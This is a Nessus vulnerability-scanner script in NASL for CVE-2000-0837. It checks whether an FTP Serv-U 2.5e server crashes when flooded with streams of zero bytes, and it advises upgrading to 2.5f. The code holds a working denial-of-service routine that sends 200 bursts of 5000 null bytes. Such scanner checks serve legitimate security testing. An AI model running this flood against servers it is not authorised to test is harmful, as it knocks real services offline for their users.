#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
# 
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10488);
 script_bugtraq_id(1543);
 script_cve_id("CVE-2000-0837");
 script_version ("$Revision: 1.14 $");
 
 
 name["english"] = "FTP Serv-U 2.5e DoS";
 name["francais"] = "Déni de service FTP Serv-U 2.5e";
 
 script_name(english:name["english"],
 	     francais:name["francais"]);
	     
 desc["english"] = "
It is possible to crash the remote FTP server
by sending it a stream of zeroes. 

This vulnerability allows an attacker to prevent
you from sharing data through FTP, and may even
crash this host.

Solution : if you are using FTP Serv-U, upgrade to
version 2.5f. If you are not, then contact your vendor
for a patch

Risk factor : High";
		 
		 
desc["francais"] = "
Il est possible de faire planter le serveur FTP distant
en lui envoyant un long flux de zéros.

Cette vulnérabilité permet à un pirate de vous empecher
de publier vos données par FTP, et peut meme faire
planter ce serveur.

Solution : si vous etes un utilisateur de FTP Serv-U,
mettez-le à jour en version 2.5f, sinon contactez
votre vendeur pour un patch

Facteur de risque : Sérieux";
	 	     
 script_description(english:desc["english"],
 		    francais:desc["francais"]);
		    
 
 script_summary(english:"Crashes Serv-U",
 		francais:"Fait planter Serv-U");
 script_category(ACT_DENIAL);	# ACT_FLOOD?
 script_family(english:"Denial of Service", francais:"Déni de service");
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
		  
 script_dependencie("find_service.nes");
  script_require_ports("Services/ftp", 21);
 exit(0);
}

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
{
 r = ftp_recv_line(socket:soc);
 if(!r)exit(0);
 req = string("HELP\r\n");
 send(socket:soc, data:req);
 r = ftp_recv_line(socket:soc);
 if(!r)exit(0);

 zero = raw_string(0x00, 0x00);
 req = crap(length:5000, data:zero) + string("\r\n");
 for(i=0;i<200;i=i+1) send(socket:soc, data:req);
 r = ftp_recv_line(socket:soc);
 close(soc);

 soc2 = open_sock_tcp(port);
 r = ftp_recv_line(socket:soc2);
 if(!r)security_hole(port);
}
